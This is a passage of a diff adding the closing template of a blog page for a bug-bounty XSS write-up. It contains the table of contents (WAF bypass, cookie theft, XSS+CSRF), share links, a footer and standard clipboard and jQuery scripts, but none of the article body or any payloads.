+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E6%89%BE%E5%88%B0%E7%9A%84"><span class="toc-number">1.</span> <span class="toc-text">怎么找到的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95-Akamai-WAF"><span class="toc-number">2.</span> <span class="toc-text">绕 Akamai WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%93%E5%B1%95%E4%B8%80%E4%B8%8B%E6%88%91%E5%AF%B9%E5%8D%8F%E8%AE%AE%E8%A7%A3%E6%9E%90%E7%BB%95Waf%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-number">2.1.</span> <span class="toc-text">拓展一下我对协议解析绕Waf的理解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E6%8A%97XSS%E6%A3%80%E6%B5%8B%E9%80%BB%E8%BE%91"><span class="toc-number">2.2.</span> <span class="toc-text">对抗XSS检测逻辑</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%87%E7%BA%A7%E5%8F%8D%E5%B0%84XSS"><span class="toc-number">3.</span> <span class="toc-text">升级反射XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96COOKIE"><span class="toc-number">3.1.</span> <span class="toc-text">获取COOKIE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS-CSRF-%E7%BB%84%E5%90%88"><span class="toc-number">3.2.</span> <span class="toc-text">XSS+CSRF 组合</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%86%E5%90%91%EF%BC%88Client-id-%E4%BB%8E%E5%93%AA%E6%9D%A5%EF%BC%9F%EF%BC%89"><span class="toc-number">3.3.</span> <span class="toc-text">逆向（Client id 从哪来？）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%92%8C%E9%9A%BE%E7%82%B9"><span class="toc-number">3.4.</span> <span class="toc-text">遇到的问题和难点</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/11/28/sony-xss/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/11/28/sony-xss/&text=一个赏金项目的XSS记录"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/11/28/sony-xss/&title=一个赏金项目的XSS记录"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/11/28/sony-xss/&is_video=false&description=一个赏金项目的XSS记录"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=一个赏金项目的XSS记录&body=Check out this article: http://example.com/2023/11/28/sony-xss/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/11/28/sony-xss/&title=一个赏金项目的XSS记录"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/11/28/sony-xss/&title=一个赏金项目的XSS记录"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/11/28/sony-xss/&title=一个赏金项目的XSS记录"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/11/28/sony-xss/&title=一个赏金项目的XSS记录"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/11/28/sony-xss/&name=一个赏金项目的XSS记录&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/11/28/sony-xss/&t=一个赏金项目的XSS记录"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    CaiS1
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/Categories/">categories</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/CaiS1">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
